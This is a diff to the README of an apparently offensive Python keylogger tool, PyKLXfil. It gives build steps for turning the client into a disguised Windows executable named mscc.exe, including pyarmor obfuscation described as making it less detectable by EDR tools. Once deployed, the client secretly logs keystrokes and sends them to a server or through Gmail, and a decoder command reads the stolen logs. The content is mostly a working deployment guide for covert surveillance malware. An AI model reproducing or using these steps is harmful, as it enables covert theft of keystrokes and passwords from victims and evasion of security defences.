@@ -40,8 +40,7 @@ pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidd
 ```
 * Once the client is deployed on a Windows machine it will start key logging and exfiltrate them back to the server.
 ### Key logging and exfiltration using gmail (more stealthy):
-* Compile and obfuscate the python gmail client for a windows machine (stand alone):
-* Note: you will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
+* You will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
 ```sh
 nano PyKLXfil-Client-mail.py
  #snip...       
@@ -49,13 +48,20 @@ nano PyKLXfil-Client-mail.py
   #app_password = 'qweertyuiop12345678'
   #to = 'example@gmail.com'
 ```
-* Make obfuscated executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
+* Make Windows executable client with either:
+1. Make obfuscated executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
  ```sh
  pip3 install pyarmor
  pip3 install pyinstaller
  pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client-mail.py -n mscc.exe
  ```
- * After recieving the encoded log files, PyKLXfil-Decoder.py can be used to decode them:
+ OR:
+ 
+2. Compile the script to exe using pyinstaller:
+```sh
+pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client-mail.py
+```
+ * After recieving the encoded log files from the client or the mail-client, PyKLXfil-Decoder.py can be used to decode them:
 ```sh
 python3 PyKLXfil-Decoder.py xxxx.log
 #will result in a decoded file Decoded-xxxx.log
